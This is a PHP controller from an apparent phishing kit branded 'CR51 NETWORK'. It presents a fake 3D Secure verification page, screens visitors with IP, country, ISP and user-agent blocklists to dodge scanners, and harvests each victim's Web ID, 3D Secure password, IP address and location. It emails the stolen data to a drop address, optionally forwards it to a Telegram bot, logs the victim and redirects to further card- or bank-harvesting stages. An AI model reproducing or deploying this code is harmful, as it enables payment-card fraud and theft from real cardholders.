<?php
defined("ALLOW") or exit('No direct script access allowed');

class Verify
{
	public $goCR51;
	public function __construct()
	{
		$this->goCR51 = new goCR51();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 5)) {
			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|SESSION RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
		checkbacklist($this->goCR51->ip_address, 'ip');
		checkbacklist($_SESSION['countryCode'], 'countrycode');
		checkbacklist($_SESSION['isp'], 'isp');
		checkbacklist($_SERVER['HTTP_USER_AGENT'], 'ua');
	}

	public function index()
	{
		if ($this->goCR51->is_mobile) {
			echo view('mobile/secure');
		} else {
			echo view('pc/secure');
		}
	}

	public function process()
	{
		if (isset($_POST['webid']) and isset($_POST['pass3d'])) {
			$_SESSION['webid']     = trim($_POST['webid']);
			$_SESSION['pass3d']    = trim($_POST['pass3d']);

			$webId    = trim($_POST['webid']);
			$password_vbv = trim($_POST['pass3d']);

			$message =
				"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: CR51 NETWORK ::</span></strong>

<strong>:: Security Question ::</strong>
			
# Web ID      : {$webId}
# 3D Password : {$password_vbv}

<strong>:: Visitor Details ::</strong>

# Date &amp; Time  : " . _date() . "  
# Device       : {$this->goCR51->platform}
# Browser      : {$this->goCR51->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['region']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->goCR51->ip_address}
# User agent   : {$this->goCR51->agent}

</pre>
</fieldset>
</pre>";

			$subject = "3D Secure :: [ {$this->goCR51->ip_address} - {$_SESSION['country']} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: CR51 NETWORK <cr51@b4ndit.sg>";
			@mail(_config('RESULT'), $subject, $message, $headers);
			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode(strip_tags($message)));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				$x = curl_exec($c);
				curl_close($c);
			}
			write(FCPATH . 'CR51/Static/log_3dsecure.txt', 'a', "{$this->goCR51->ip_address}\r\n");
			write(FCPATH . 'CR51/Static/log_click.txt', 'a', "|" . _time() . "|{$this->goCR51->ip_address}|{$_SESSION['country']}|{$this->goCR51->browser}|Submit 3D Secure\r\n");

			if (_config('DOUBLECARD') == 'on') {
				$_SESSION['access'] = 6;
				redirect(base_url() . 'payment/#errorId=' . md5(time()));
			} elseif (_config('GETBANK') == 'on') {
				$_SESSION['access'] = 7;
				redirect(base_url() . 'bank/#');
			} else {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'finished/#_dn=' . md5(rand(0, 999)));
			}
		}
	}
}
